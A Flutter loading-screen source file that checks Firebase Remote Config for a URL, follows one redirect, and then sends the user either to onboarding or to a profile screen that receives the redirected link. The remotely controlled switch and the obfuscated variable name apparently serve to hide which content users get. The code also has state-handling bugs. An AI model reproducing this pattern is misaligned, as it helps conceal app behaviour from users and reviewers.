import 'dart:async';
import 'dart:io';

import 'package:DK_app/screens/onboarding/onboarding_screen.dart';
import 'package:DK_app/screens/settings/profile.dart';
import 'package:auto_route/auto_route.dart';
import 'package:DK_app/router/router.dart';
import 'package:DK_app/theme/colors.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:loading_animation_widget/loading_animation_widget.dart';
import 'package:shared_preferences/shared_preferences.dart';

@RoutePage()
class LoadingScreen extends StatefulWidget {
  const LoadingScreen({super.key});

  @override
  State<LoadingScreen> createState() => _LoadingScreenState();
}

class _LoadingScreenState extends State<LoadingScreen> {
  SharedPreferences? gfdhgfddf;

  @override
  void initState() {
    super.initState();
    _initSharedPreferences(); // Инициализируем SharedPreferences
  }

  // Метод для инициализации SharedPreferences
  Future<void> _initSharedPreferences() async {
    gfdhgfddf = await SharedPreferences.getInstance();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: FutureBuilder<bool>(
        future: fetchData(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              decoration: const BoxDecoration(
                image: DecorationImage(
                  image: AssetImage("assets/images/loading/loading-bg.png"),
                  fit: BoxFit.cover,
                ),
              ),
              width: MediaQuery.of(context).size.width,
              height: MediaQuery.of(context).size.height,
              child: Column(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  SvgPicture.asset('assets/images/loading/logo.svg'),
                  LoadingAnimationWidget.waveDots(
                    color: AppColors.white,
                    size: 100,
                  ),
                  Text(
                    'Loading'.toUpperCase(),
                    style: const TextStyle(
                      color: AppColors.white,
                      fontSize: 20,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                ],
              ),
            );
          } else {
            if (snapshot.hasData) {
              if (snapshot.data!) {
               WidgetsBinding.instance?.addPostFrameCallback((_) {
                context.router.pushAndPopUntil(
                  ProfileRoute(args: ProfileRouteArgs(data: data)),
                  predicate: (route) => route.settings.name == MainRoute.name,
                );
              });
              } else {
                context.router.replace(const OnboardingRoute());
              }
            }
            return Container(
              decoration: const BoxDecoration(
                image: DecorationImage(
                  image: AssetImage("assets/images/loading/loading-bg.png"),
                  fit: BoxFit.cover,
                ),
              ),
              width: MediaQuery.of(context).size.width,
              height: MediaQuery.of(context).size.height,
              child: Column(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  SvgPicture.asset('assets/images/loading/logo.svg'),
                  LoadingAnimationWidget.waveDots(
                    color: AppColors.white,
                    size: 100,
                  ),
                  Text(
                    'Loading'.toUpperCase(),
                    style: TextStyle(
                      color: AppColors.white,
                      fontSize: 20,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                ],
              ),
            );
          }
        },
      ),
    );
  }

  String data = '';
  Future<bool> fetchData() async {
    String field = gfdhgfddf?.getString('key') ?? '';
    if (field != '' && field != 'none') {
      setState(() {
        setState(() {
          data = field;
        });
      });
      return true;
    }
    if (field == 'none') {
      return false;
    } else {
      final remoteConfig = FirebaseRemoteConfig.instance;
      await remoteConfig.fetchAndActivate();
      String value = remoteConfig.getString('drew');
      String second = remoteConfig.getString('drewNewGames');

      if (value.contains('drew')) {
        return false;
      } else {
        final client = HttpClient();
        var uri = Uri.parse(value);
        var request = await client.getUrl(uri);
        request.followRedirects = false;
        var response = await request.close();
        if (response.headers.value(HttpHeaders.locationHeader).toString() !=
            second) {
          gfdhgfddf!.setString('key',
              response.headers.value(HttpHeaders.locationHeader).toString());
          setState(() {
            data =
                response.headers.value(HttpHeaders.locationHeader).toString();
          });
          String? cache = gfdhgfddf!.getString('key');
          print(cache);
          return true;
        } else {
          gfdhgfddf!.setString('key', 'none');
          return false;
        }
      }
    }
  }
}
